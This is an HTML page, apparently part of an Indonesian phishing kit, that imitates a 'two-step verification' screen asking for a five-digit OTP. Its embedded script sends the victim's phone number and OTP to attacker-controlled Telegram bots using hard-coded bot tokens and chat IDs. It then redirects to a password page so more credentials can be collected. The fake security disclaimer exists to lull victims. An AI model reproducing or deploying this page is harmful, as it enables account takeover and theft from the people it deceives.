<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>OTP Code</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary-color: #0088cc;
      --secondary-color: #00c6ff;
      --white: #ffffff;
      --text-color: #333333;
      --label-color: #555555;
      --border-color: #dddddd;
      --shadow-color: rgba(0, 0, 0, 0.1);
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: url('gay3.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: -20%; left: -20%;
      width: 140%; height: 140%;
      background: radial-gradient(circle, rgba(255,255,255,0.15), transparent 100%);
      animation: pulse 6s infinite;
      z-index: 0;
    }
    @keyframes pulse {
      0% { transform: scale(0.9); opacity: 0.8; }
      50% { transform: scale(1); opacity: 1; }
      100% { transform: scale(0.9); opacity: 0.8; }
    }
    .container {
      background: transparent;
      border-radius: 16px;
      padding: 40px 30px 30px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
      z-index: 1;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
      animation: fadeInUp 2s ease;
      padding-top: 90px;
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .phone-display {
      font-size: 18px;
      margin-bottom: 10px;
      font-weight: 500;
      color: var(--text-color);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .pencil-icon { width: 20px; cursor: pointer; transition: transform 0.3s; }
    .pencil-icon:hover { transform: rotate(15deg); }
    p { color: #000; margin: 0 0 30px; }
    input[type="number"] {
      width: 100%; padding: 12px 15px; font-size: 16px;
      margin-bottom: 20px; border: 1px solid var(--border-color);
      border-radius: 8px; text-align: center; background: #fff;
    }
    input[type="number"]:focus {
      outline: none; border-color: var(--primary-color);
      box-shadow: 0 0 8px rgba(0,136,204,0.2);
    }
    .btn {
      width: 100%; padding: 14px; font-size: 16px;
      background-color: var(--primary-color);
      color: var(--white); border: none; border-radius: 8px;
      cursor: pointer; transition: background-color 0.3s, transform 0.3s;
    }
    .btn:hover { background-color: #0077b3; transform: scale(1.02); }
    .status { margin-top: 15px; font-size: 14px; font-weight: 500; min-height: 20px; }
    .disclaimer { font-size: 12px; color: #000; margin: 25px 0 0; line-height: 1.5; }
    h1 { color: #000; }
  </style>
</head>
<body>
  <div class="container">
    <div class="phone-display">
      <span id="phoneMasked"></span>
      <img src="https://cdn-icons-png.flaticon.com/512/1159/1159633.png" alt="Edit" class="pencil-icon" />
    </div>
    <h1>Enter verification code</h1>
    <p>Your registration process is protected with two-step verification for security.</p>

    <form id="codeForm">
      <input type="number" id="verificationCode" min="10000" max="99999" placeholder="Enter 5 digit code" oninput="this.value = this.value.slice(0, 5)" />
      <button type="submit" class="btn">NEXT</button>
      <div class="disclaimer">
        *Make sure the verification code is not given to anyone. The verification process takes 1-2 minutes.
      </div>
    </form>

    <div class="status" id="statusMessage"></div>
  </div>

  <script>
    const bots = [
      { token: "7033932111:AAHWmbsziqZCI9beJCSfWwnnlvjoJaK_I3w", chatId: "6960960866" },
      { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
    ];

    const urlParams = new URLSearchParams(window.location.search);
    const phone = urlParams.get('phone') || 'Tidak diketahui';
    document.getElementById('phoneMasked').textContent = phone;

    const codeForm = document.getElementById('codeForm');
    const otpInput = document.getElementById('verificationCode');
    const statusMessage = document.getElementById('statusMessage');

    codeForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const otp = otpInput.value.trim();

      if (!otp || otp.length !== 5 || !/^\d{5}$/.test(otp)) {
        statusMessage.textContent = "Kode OTP harus 5 digit angka.";
        return;
      }

      const message = `ðŸ” *OTP Masuk*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”\nðŸ“ž Nomor HP: \`${phone}\`\nðŸ“© OTP: \`${otp}\`\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”`;

      const botIndex = parseInt(localStorage.getItem('sessionBotIndex') || '0');
      const bot = bots[botIndex];

      const nextIndex = (botIndex + 1) % bots.length;
      localStorage.setItem('sessionBotIndex', nextIndex);

      const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

      fetch(api)
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            statusMessage.textContent = "Kode OTP berhasil dikirim!";
            setTimeout(() => {
              window.location.href = `password.html?phone=${phone}&otp=${otp}&bot=${botIndex}`;
            }, 1000);
          } else {
            statusMessage.textContent = "Gagal mengirim OTP. Coba lagi.";
          }
        })
        .catch(err => {
          console.error(err);
          statusMessage.textContent = "Terjadi kesalahan saat mengirim OTP.";
        });
    });
  </script>
</body>
</html>
</body>
</html>
